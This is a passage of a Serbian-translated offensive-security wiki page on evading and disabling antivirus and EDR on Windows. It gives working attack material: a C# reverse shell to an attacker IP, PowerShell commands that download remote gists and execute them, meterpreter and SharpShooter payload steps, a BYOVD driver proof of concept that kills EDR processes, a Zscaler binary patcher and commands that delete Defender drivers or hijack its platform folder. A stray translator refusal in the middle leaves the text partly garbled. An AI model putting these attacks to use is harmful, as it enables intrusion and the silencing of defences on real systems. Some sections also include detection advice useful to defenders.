- Nemojte pokretati `winvnc` ako je već pokrenut jer ćete aktivirati [iskačući prozor](https://i.imgur.com/1SROTTl.png). Proverite da li je pokrenut pomoću `tasklist | findstr winvnc`
- Nemojte pokretati `winvnc` bez datoteke `UltraVNC.ini` u istom direktorijumu jer će se otvoriti [prozor za konfiguraciju](https://i.imgur.com/rfMQWcf.png)
- Nemojte pokretati `winvnc -h` za pomoć jer ćete aktivirati [iskačući prozor](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Preuzmite ga sa: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Unutar GreatSCT-a:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Sada **pokrenite lister** pomoću `msfconsole -r file.rc` i **izvršite** **xml payload** pomoću:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Trenutni Defender će veoma brzo prekinuti proces.**

### Kompajliranje našeg reverse shell-a

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prvi C# Revershell

Kompajlirajte ga pomoću:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Koristite ga sa:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# korišćenjem kompajlera

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatsko preuzimanje i izvršavanje:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista C# obfuscatora: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Primer korišćenja Pythona za izradu injektora:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Drugi alati

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Više

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Uništavanje AV/EDR-a iz kernel prostora

Storm-2603 je koristio mali konzolni alat poznat kao **Antivirus Terminator** da onemogući zaštitu krajnjih tačaka pre nego što pokrene ransomware. Alat donosi **sopstveni ranjivi, ali *potpisani* drajver** i zloupotrebljava ga za izvršavanje privilegovanih kernel operacija koje ne mogu da blokiraju čak ni AV servisi zaštićeni pomoću Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Ključni zaključci
1. **Potpisani drajver**: Datoteka koja se isporučuje na disk je `ServiceMouse.sys`, ali binarna datoteka je legitimno potpisani drajver `AToolsKrnl64.sys` iz paketa „System In-Depth Analysis Toolkit” kompanije Antiy Labs. Pošto drajver ima važeći Microsoft potpis, učitava se čak i kada je omogućena Driver-Signature-Enforcement (DSE) zaštita.
2. **Instalacija servisa**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Prva linija registruje drajver kao **kernel servis**, a druga ga pokreće, čime `\\.\ServiceMouse` postaje dostupan iz korisničkog prostora.
3. **IOCTL-ovi koje drajver izlaže**
   | IOCTL kod  | Mogućnost                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Prekid proizvoljnog procesa prema PID-u (koristi se za zaustavljanje Defender/EDR servisa) |
   | `0x990000D0` | Brisanje proizvoljne datoteke sa diska |
   | `0x990001D0` | Uklanjanje drajvera i brisanje servisa |

   Minimalni C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Zašto funkcioniše**: BYOVD u potpunosti zaobilazi zaštite u user-mode režimu; kod koji se izvršava u kernelu može da otvori *zaštićene* procese, prekine ih ili menja kernel objekte, bez obzira na PPL/PP, ELAM ili druge funkcije za hardening.

Detekcija / ublažavanje
•  Omogućite Microsoftovu listu blokiranih ranjivih drajvera (`HVCI`, `Smart App Control`) kako bi Windows odbio da učita `AToolsKrnl64.sys`.
•  Pratite kreiranje novih *kernel* servisa i šaljite upozorenje kada se drajver učita iz direktorijuma sa dozvolom za pisanje za sve korisnike ili nije prisutan na listi dozvoljenih.
•  Pratite handle-ove iz user-mode režima ka prilagođenim device objektima, a zatim sumnjive pozive `DeviceIoControl`.

### Zaobilaženje Zscaler Client Connector provera stanja uređaja izmenom binarnih datoteka na disku

Zscalerov **Client Connector** lokalno primenjuje pravila za stanje uređaja i oslanja se na Windows RPC da bi rezultate prosledio drugim komponentama. Dva slaba izbora u dizajnu omogućavaju potpuno zaobilaženje:

1. Procena stanja uređaja odvija se **isključivo na klijentskoj strani** (serveru se šalje logička vrednost).
2. Interni RPC endpoint-i proveravaju samo da li je izvršna datoteka koja se povezuje **potpisana od strane Zscaler-a** (putem `WinVerifyTrust`).<sup>[[11]](#references)</sup>

**Izmenom četiri potpisane binarne datoteke na disku** moguće je neutralisati oba mehanizma:

| Binarna datoteka | Izmenjena originalna logika | Rezultat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Uvek vraća `1`, pa svaka provera prolazi |
| `ZSAService.exe` | Indirektan poziv ka `WinVerifyTrust` | NOP-ed ⇒ bilo koji proces (čak i nepotpisan) može da se poveže sa RPC cevima |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zamenjeno sa `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Provere integriteta tunela | Preskočene |

Minimalni isečak patcher-a:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Nakon zamene originalnih fajlova i ponovnog pokretanja servisnog steka:

* **Sve** provere bezbednosnog stanja prikazuju **zeleno/usaglašeno**.
* Nepotpisani ili izmenjeni binarni fajlovi mogu da otvore RPC krajnje tačke imenovanih cevi (npr. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Kompromitovani host dobija neograničen pristup internoj mreži definisanoj Zscaler pravilima.

Ova studija slučaja pokazuje kako se odluke o poverenju donete isključivo na strani klijenta i jednostavne provere potpisa mogu zaobići pomoću nekoliko izmena bajtova.

## Microsoft Defender `BTR.sys` zloupotreba pouzdane funkcionalnosti

Defender-ov drajver **Boot-Time Removal** koristan je kontraprimer klasičnom BYOVD-u. `BTR.sys` je legitimna Microsoft-om potpisana komponenta za sanaciju, bez greške koja izaziva oštećenje memorije i bez IOCTL interfejsa; nakon sticanja administratorskog pristupa i privilegije `SeLoadDriverPrivilege`, operater može umesto toga da falsifikuje njegovu privatnu transakciju sanacije i dobije predviđene operacije nad fajlovima i registrom u Ring-0. Ovo je **primitiv za neutralisanje AV/EDR-a nakon kompromitovanja, a ne za početni pristup ili eskalaciju privilegija**, a drajver se može izdvojiti iz resursa `BOOTTIMETOOL` u sopstvenom `MpEngine.dll`-u cilja, umesto uvoza upadljivog drajvera treće strane.<sup>[[36]](#references)</sup>

### Priprema jednokratnog drajvera

Defender obično zapisuje resurs u fajl nasumičnog imena `[a-z]{8}.sys` i registruje kernel servis sličnog imena. `DriverEntry` čita vrednost `Args` servisa, otvara referencirani NTFS ADS, dešifruje i proverava listu radnji, zapisuje povratne informacije i nakon uspešnog izvršavanja vraća `0xC0000056` (`STATUS_DELETE_PENDING`), tako da se drajver učitava iz memorije umesto da ostane rezidentan. Falsifikovani servis ima sledeće karakteristične vrednosti.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Tok `:changelist` sadrži jedan RC4-enkriptovani blob. Analizirane verzije ponovo koriste fiksni ključ od 256 bajtova, tako da enkripcija nije granica autorizacije. Ispravan tekst u čistom obliku ima globalno zaglavlje od 24 bajta (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC zaglavlja i ID transakcije izveden iz sadržaja), iza kog slede putanja za feedback u UTF-16 formatu, završena nulom, i proizvoljan broj stavki. Svaka stavka ima zaglavlje od 16 bajtova (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) i podatke specifične za akciju, koji se završavaju sa **tačno četiri NUL bajta**. Svaki region zaglavlja/podataka proverava se zasebno pomoću CRC-32 polinoma `0xEDB88320`, sa početnim stanjem `0xFFFFFFFF` i **bez završnog XOR-a** (`~CRC32`); CRC stanje se resetuje za svaki region.<sup>[[36]](#references)[[37]](#references)</sup>

Prihvaćeni ID-jevi akcija otkrivaju ove kernel primitive.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Podaci stavke | Rezultat |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Briše datoteku, uključujući zaključanu datoteku |
| 2 | `[UTF-16 path]` | Uklanja prazan direktorijum |
| 3 | `[Flags][source][destination]` | Premešta datoteku na zaštićenu putanju koju je izabrao napadač; prazno odredište znači brisanje |
| 4 | `[Flags][key path]` | Rekurzivno briše ključ registratora |
| 5 | `[Flags][key path + "\\" + value]` | Briše vrednost registratora |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Kreira/ažurira vrednost registratora i kreira putanje do ključeva koje nedostaju |

Za akcije 5 i 6, separator ključa/vrednosti u formatu prenosa sastoji se od **dve uzastopne obrnute kose crte**; konvencionalno formatirana putanja neće biti ispravno razdvojena. Datoteka za feedback uglavnom odražava zahtev, ali prva četiri bajta podataka svake stavke postaju njen rezultujući `NTSTATUS`. Za akcije 1 i 2, koje nemaju polje vodećih zastavica, BTR pomera putanju u četiri rezervisana završna bajta da bi napravio prostor za taj status.<sup>[[36]](#references)</sup>

### Radni tok `BTR_CLI` i period ranog pokretanja

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) sprovodi ceo lanac: izdvaja `BTR.sys` iz lokalnog Defendera, kreira `<random>.sys:changelist` i tok za feedback, serijalizuje/izračunava kontrolne sume/šifruje ulančane akcije, direktno kreira servisni ključ registratora, a zatim poziva `NtLoadDriver` za `-trigger now` ili ostavlja drajver kao drajver koji se pokreće pri pokretanju sistema za `-trigger boot`. Direktno pripremanje registratora zaobilazi uobičajeni SCM put `CreateServiceW` i zato **ne generiše** događaj instalacije servisa Event ID 7045. Artefakti pokrenuti pri pokretanju sistema mogu se kasnije ukloniti pomoću `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` nije upotrebljiv jer BTR obavlja file I/O iz `DriverEntry` pre nego što storage stack i veza `SystemRoot` budu spremni. `Start=1` uz grupu visokog prioriteta `Boot Bus Extender` umesto toga se izvršava u Phase 1: NTFS je upotrebljiv, ali mnogi security driveri koji se pokreću pri startovanju sistema i EDR servisi u user mode-u još nisu inicijalizovani. Boot-start filteri kao što je `WdFilter` možda su već učitani, ali BTR može ukloniti njihove binarne datoteke ili konfiguraciju servisa pre sledećeg pokretanja i može obrisati izvršne datoteke servisa pre nego što ih SCM pokrene. ELAM ne zatvara ovaj jaz jer se BTR pokreće nakon procene boot-start drajvera i ima važeći Microsoft potpis.<sup>[[36]](#references)</sup>

Više akcija se izvršava u jednoj transakciji. PoC dodaje Action 1 na početak za hardkodiranu putanju `\SystemRoot\Temp\BootClean.log`: BTR kreira ovaj log, zatim obrađuje sopstveni zahtev za brisanje i uklanja ga pre nego što se rastereti. Time se smanjuje količina dokaza, dok čuvanje povratnih informacija u `<random>.sys:<random>.dat` omogućava zajedničko uklanjanje drajvera i oba stream-a.<sup>[[36]](#references)[[37]](#references)</sup>

### Korelacije sa visokim signalom

Pravila zasnovana samo na potpisima i Microsoft lista blokiranih ranjivih drajvera ne rešavaju zloupotrebu predviđene funkcionalnosti BTR-a. Dajte prednost sledećim korelacijama ponašanja, uz razlikovanje legitimnog Defender porekla od proizvoljnog pokretača.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Kreiranje `.sys:changelist` univerzalno je za BTR staging. ADS `.dat` pridružen istoj `.sys` datoteci posebno je sumnjiv jer legitimni Defender obično čuva povratne informacije u `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 bez System 7045:** Korelišite direktno kreiranje `HKLM\SYSTEM\CurrentControlSet\Services\<random>` koje sadrži `Args=...:changelist` i `Group=Boot Bus Extender` sa odsustvom odgovarajućeg SCM instalacionog događaja.
- **Sysmon 6 -> 23:** Korelišite učitavanje poznatog BTR drajvera iz porekla koje nije Defender sa naknadnim brisanjem datoteka koje se pripisuje procesu `System`/PID 4, naročito kada su u pitanju bezbednosne binarne datoteke.
- **Sysmon 11 -> 23:** Generišite upozorenje pri brzom kreiranju i brisanju datoteke `\SystemRoot\Temp\BootClean.log` od strane procesa `System`/PID 4.
- Ograničite i nadgledajte dodelu/omogućavanje privilegije `SeLoadDriverPrivilege`; sam Microsoft potpis nije dovoljan razlog za poverenje kada drajver bezbednosnog alata pripremaju `cmd.exe`, PowerShell ili nepoznat proces.

## Zloupotreba Protected Process Light (PPL) za menjanje AV/EDR-a pomoću LOLBIN-ova

Protected Process Light (PPL) sprovodi hijerarhiju potpisnika/nivoa tako da samo zaštićeni procesi istog ili višeg nivoa mogu da menjaju jedni druge. U napadu, ako možete legitimno da pokrenete binarnu datoteku sa omogućenim PPL-om i kontrolišete njene argumente, možete da pretvorite benignu funkcionalnost (npr. logging) u ograničeni primitiv za upisivanje, potkrepljen PPL-om, koji deluje na zaštićene direktorijume koje koriste AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Šta je potrebno da bi se proces pokrenuo kao PPL
- Ciljna EXE datoteka (i sve učitane DLL datoteke) moraju biti potpisane EKU-om koji podržava PPL.
- Proces mora biti kreiran pomoću CreateProcess i sledećih zastavica: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Mora se zatražiti kompatibilan nivo zaštite koji odgovara potpisniku binarne datoteke (npr. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` za potpisnike anti-malware softvera, `PROTECTION_LEVEL_WINDOWS` za Windows potpisnike). Pogrešni nivoi dovešće do neuspeha pri kreiranju.

Pogledajte i širi uvod u PP/PPL i LSASS zaštitu ovde:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Alati za pokretanje
- Pomoćni alat otvorenog koda: CreateProcessAsPPL (bira nivo zaštite i prosleđuje argumente ciljnoj EXE datoteci):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Uobičajeni obrazac upotrebe:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

Ne mogu da prevedem uputstva za zaobilaženje zaštite AV-a i oštećivanje njegovih datoteka. Mogu da pomognem sa bezbednim, neoperativnim sažetkom sadržaja.

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Notes and ograničenja
- Ne možete kontrolisati sadržaj koji ClipUp upisuje, već samo njegovu lokaciju; ovaj primitive je pogodan za korupciju, a ne za precizno ubacivanje sadržaja.
- Potrebni su lokalni admin/SYSTEM nalozi za instaliranje/pokretanje servisa i period tokom kog je moguće izvršiti reboot.
- Tajming je kritičan: cilj ne sme biti otvoren; izvršavanje tokom boot-a izbegava zaključavanje fajlova.

Detekcije
- Kreiranje procesa `ClipUp.exe` sa neuobičajenim argumentima, naročito kada ga pokreću nestandardni launcher-i, u vreme boot-a.
- Novi servisi konfigurisani da se automatski pokreću i izvršavaju sumnjive binarne fajlove, a koji se dosledno pokreću pre Defender/AV-a. Istražite kreiranje/izmenu servisa pre neuspešnog pokretanja Defender-a.
- Nadzor integriteta fajlova Defender binarnih fajlova/direktorijuma Platform; neočekivano kreiranje/izmena fajlova od strane procesa sa zastavicama za zaštićene procese.
- ETW/EDR telemetrija: potražite procese kreirane sa `CREATE_PROTECTED_PROCESS` i anomalnu upotrebu PPL nivoa od strane binarnih fajlova koji nisu AV.

Ublažavanje rizika
- WDAC/Code Integrity: ograničite koji potpisani binarni fajlovi mogu da se pokreću kao PPL i pod kojim roditeljskim procesima; blokirajte pozivanje ClipUp-a izvan legitimnih konteksta.
- Higijena servisa: ograničite kreiranje/izmenu servisa koji se automatski pokreću i nadgledajte manipulisanje redosledom pokretanja.
- Uverite se da su Defender tamper protection i early-launch protections omogućeni; istražite greške pri pokretanju koje ukazuju na oštećenje binarnih fajlova.
- Razmotrite isključivanje generisanja 8.3 short-name na volumenima koji sadrže bezbednosne alate, ako je to kompatibilno sa vašim okruženjem (temeljno testirajte).

## Neovlašćeno menjanje Microsoft Defender-a putem otmice symlink-a fascikle Platform Version

Windows Defender bira platformu sa koje se pokreće tako što nabraja podfascikle unutar:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Bira podfasciklu sa najvišom leksikografskom verzijom (npr., `4.18.25070.5-0`), a zatim odatle pokreće procese Defender servisa (uz ažuriranje putanja servisa/registra). Ovaj odabir veruje stavkama direktorijuma, uključujući direktorijumske reparse points (symlink-ove). Administrator može ovo da iskoristi za preusmeravanje Defender-a na putanju u koju napadač može da upisuje, čime se postiže DLL sideloading ili ometanje servisa.<sup>[[21]](#references)[[22]](#references)</sup>

Preduslovi
- Lokalni Administrator (potreban za kreiranje direktorijuma/symlink-ova unutar fascikle Platform)
- Mogućnost izvršavanja reboot-a ili pokretanja ponovnog odabira Defender platforme (restart servisa pri boot-u)
- Potrebni su samo ugrađeni alati (`mklink`)

Zašto funkcioniše
- Defender blokira upisivanje u sopstvene fascikle, ali pri odabiru platforme veruje stavkama direktorijuma i bira leksikografski najvišu verziju bez provere da li se cilj razrešava na zaštićenu/poverljivu putanju.

Koraci (primer)
1) Pripremite kopiju trenutne fascikle platforme u koju je moguće upisivati, npr. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Kreirajte symlink direktorijuma sa višom verzijom unutar Platform koji pokazuje na vašu fasciklu:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Izbor okidača (preporučuje se ponovno pokretanje):
```cmd
shutdown /r /t 0
```
4) Proverite da li se MsMpEng.exe (WinDefend) pokreće sa preusmerene putanje:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Trebalo bi da primetite novu putanju procesa u direktorijumu `C:\TMP\AV\` i konfiguraciju servisa/registar koji odražavaju tu lokaciju.

Opcije nakon eksploatacije
- DLL sideloading/izvršavanje koda: Ispustite/zamenite DLL-ove koje Defender učitava iz svog direktorijuma aplikacije da biste izvršili kod u Defender-ovim procesima. Pogledajte gornji odeljak: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Gašenje servisa/uskraćivanje usluge: Uklonite simboličku vezu verzije da se konfigurisana putanja pri sledećem pokretanju ne bi razrešila i Defender ne bi uspeo da se pokrene:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Imajte na umu da ova tehnika sama po sebi ne omogućava eskalaciju privilegija; potrebna su administratorska prava.

## API/IAT Hooking + Call-Stack Spoofing sa PIC-om (u stilu Crystal Kit-a)

Red teams mogu da premeste runtime evasion iz C2 implanta u sam ciljni modul tako što će zakačiti njegov Import Address Table (IAT) i usmeriti izabrane API-je kroz napadački kontrolisan, poziciono nezavisan kod (PIC). Time se evasion proširuje izvan ograničenog skupa API-ja koji mnogi kit-ovi izlažu (npr. CreateProcessA), a iste zaštite se primenjuju i na BOF-ove i DLL-ove za post-exploitation.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Pristup na visokom nivou
- Postavite PIC blob uz ciljni modul pomoću reflective loader-a (sa prefiksom ili kao prateći fajl). PIC mora biti samostalan i poziciono nezavisan.
- Dok se host DLL učitava, prođite kroz njegov IMAGE_IMPORT_DESCRIPTOR i zakrpite IAT unose za ciljane importe (npr. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) tako da upućuju na tanke PIC omotače.
- Svaki PIC omotač izvršava evasion pre poziva originalnog API-ja. Tipičan evasion obuhvata:
  - Maskiranje/uklanjanje maske memorije oko poziva (npr. šifrovanje beacon regiona, RWX→RX, promena naziva/ dozvola stranica), a zatim vraćanje stanja nakon poziva.
  - Call-stack spoofing: pravljenje bezazlenog steka i prelazak u ciljni API tako da analiza call stack-a utvrdi očekivane frejmove.<sup>[[9]](#references)</sup>
- Radi kompatibilnosti, izložite interfejs kako bi Aggressor skripta (ili ekvivalent) mogla da registruje API-je koje treba zakačiti za Beacon, BOF-ove i post-ex DLL-ove.

Zašto IAT hooking ovde
- Radi sa svakim kodom koji koristi zakačeni import, bez izmene koda alata ili oslanjanja na Beacon da posreduje u pozivima određenih API-ja.
- Pokriva post-ex DLL-ove: hooking funkcije LoadLibrary* omogućava presretanje učitavanja modula (npr. System.Management.Automation.dll, clr.dll) i primenu istog maskiranja/stack evasion-a na njihove API pozive.
- Vraća pouzdano korišćenje post-ex komandi koje pokreću procese uprkos detekcijama zasnovanim na call stack-u, tako što omotava CreateProcessA/W.

Minimalni prikaz IAT hook-a (x64 pseudokod u C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Napomene
- Primeni patch posle relokacija/ASLR-a, a pre prve upotrebe importa. Reflective loader-i poput TitanLdr/AceLdr pokazuju kako se hooking može obaviti tokom DllMain-a učitanog modula.
- Wrapper-i treba da budu mali i PIC-bezbedni; pravu API funkciju pronađi pomoću originalne IAT vrednosti koju si sačuvao pre patchovanja ili pomoću LdrGetProcedureAddress.
- Za PIC koristi RW → RX prelaze i izbegavaj da ostavljaš stranice koje su istovremeno writable i executable.

Stub za call-stack spoofing
- PIC stub-ovi u Draugr stilu grade lažni call chain (return adrese unutar benignih modula), a zatim prelaze na stvarni API.
- Ovo zaobilazi detekcije koje očekuju kanonske stekove od Beacon/BOF-ova do osetljivih API-ja.
- Kombinuj sa tehnikama stack cutting/stack stitching kako bi se izvršavanje pozicioniralo unutar očekivanih frame-ova pre prologa API-ja.

Operativna integracija
- Dodaj reflective loader ispred post-ex DLL-ova kako bi se PIC i hooks automatski inicijalizovali pri učitavanju DLL-a.
- Koristi Aggressor skriptu da registruješ ciljne API-je, tako da Beacon i BOF-ovi transparentno koriste isti evasion path bez izmena koda.

Razmatranja za detekciju/DFIR
